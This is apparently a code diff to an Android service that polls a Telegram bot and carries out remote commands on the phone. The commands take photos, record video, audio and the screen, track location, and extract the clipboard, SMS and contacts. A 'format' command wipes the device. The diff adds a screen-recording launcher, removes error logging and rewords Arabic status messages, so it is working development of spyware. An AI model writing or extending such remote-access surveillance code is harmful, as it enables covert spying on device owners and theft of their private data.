@@ -47,7 +47,7 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v2026"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v2026_fix"
         private const val NOTIFICATION_ID = 2026
 
         private fun getObfuscatedToken(): String {
@@ -84,7 +84,7 @@ class BackgroundControlService : Service() {
         try {
             startForeground(NOTIFICATION_ID, createStrictNotification())
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start foreground service: ${e.message}")
+            Log.e(TAG, "Foreground start error: ${e.message}")
         }
         if (!isRunning) {
             isRunning = true
@@ -172,16 +172,11 @@ class BackgroundControlService : Service() {
                                 }
                             }
                         }
-                    } else {
-                        Log.w(TAG, "Telegram API error response code: $responseCode")
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Polling pipeline exception: ${e.message}", e)
                     try { Thread.sleep(6000) } catch (_: InterruptedException) {}
                 } finally {
-                    try {
-                        connection?.disconnect()
-                    } catch (_: Exception) {}
+                    try { connection?.disconnect() } catch (_: Exception) {}
                 }
             }
         }
@@ -210,7 +205,7 @@ class BackgroundControlService : Service() {
                 data == "take_photo" -> captureCameraImage(chatId, "front")
                 data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
                 data == "record_video" -> executeCameraVideoRecording(chatId, 10)
-                data == "record_screen" -> sendDirectMessage(chatId, "🎬 تسجيل الشاشة يتطلب تفعيلاً تفاعلياً من واجهة الجهاز.")
+                data == "record_screen" -> launchScreenRecordActivity(chatId)
                 data == "record_audio" -> executeAudioCapture(chatId, 30)
                 data == "get_location" -> fetchStrictRealTimeLocation(chatId)
                 data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
@@ -233,6 +228,16 @@ class BackgroundControlService : Service() {
                 else -> sendDirectMessage(chatId, "⚙️ تم تنفيذ الإجراء: $data")
             }
         }
+    }
+
+    private fun launchScreenRecordActivity(chatId: String) {
+        sendDirectMessage(chatId, "🎬 يرجى فتح واجهة التطبيق على الجهاز لتمكين إذن تسجيل الشاشة النظامي.")
+        try {
+            val intent = Intent(applicationContext, MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            applicationContext.startActivity(intent)
+        } catch (_: Exception) {}
     }
 
     private fun captureCameraImage(chatId: String, facing: String) {
@@ -354,10 +359,10 @@ class BackgroundControlService : Service() {
                     val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                     sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
                 } else {
-                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً بنظام التشغيل.")
+                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً.")
                 }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "ℹ️ قراءة الحافظة تتطلب تركيز الواجهة النشطة في الإصدارات الحديثة.")
+                sendDirectMessage(chatId, "ℹ️ قراءة الحافظة تتطلب تواجداً نشطاً للواجهة.")
             }
         }
     }
@@ -374,7 +379,7 @@ class BackgroundControlService : Service() {
                 sendDirectMessage(chatId, "⚡ تم إرسال أمر الفرمتة.")
             }
         } catch (e: Exception) {
-            sendDirectMessage(chatId, "❌ فشل الفرمتة: يتطلب صلاحيات Device Admin أو Root.")
+            sendDirectMessage(chatId, "❌ فشل الفرمتة: يتطلب صلاحيات Root أو Device Admin.")
         }
     }
 
@@ -582,7 +587,7 @@ class BackgroundControlService : Service() {
 
     private fun extractSmsArchive(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_SMS)) {
-            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل غير ممنوحة.")
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل غير ممنوحة من قبل النظام.")
             return
         }
         executionExecutor.execute {
@@ -601,14 +606,14 @@ class BackgroundControlService : Service() {
                 }
                 sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد رسائل." else sb.toString())
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ الرسائل: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ استخراج الرسائل: ${e.message}")
             }
         }
     }
 
     private fun extractContactsDirectory(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
-            sendDirectMessage(chatId, "❌ صلاحية جهات الاتصال غير ممنوحة.")
+            sendDirectMessage(chatId, "❌ صلاحية جهات الاتصال غير ممنوحة من قبل النظام.")
             return
         }
         executionExecutor.execute {
@@ -626,7 +631,7 @@ class BackgroundControlService : Service() {
                 }
                 sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد جهات اتصال." else sb.toString())
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ جهات الاتصال: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ استخراج جهات الاتصال: ${e.message}")
             }
         }
     }
@@ -660,9 +665,7 @@ class BackgroundControlService : Service() {
             connection.inputStream?.close()
         } catch (_: Exception) {
         } finally {
-            try {
-                connection?.disconnect()
-            } catch (_: Exception) {}
+            try { connection?.disconnect() } catch (_: Exception) {}
         }
     }
 
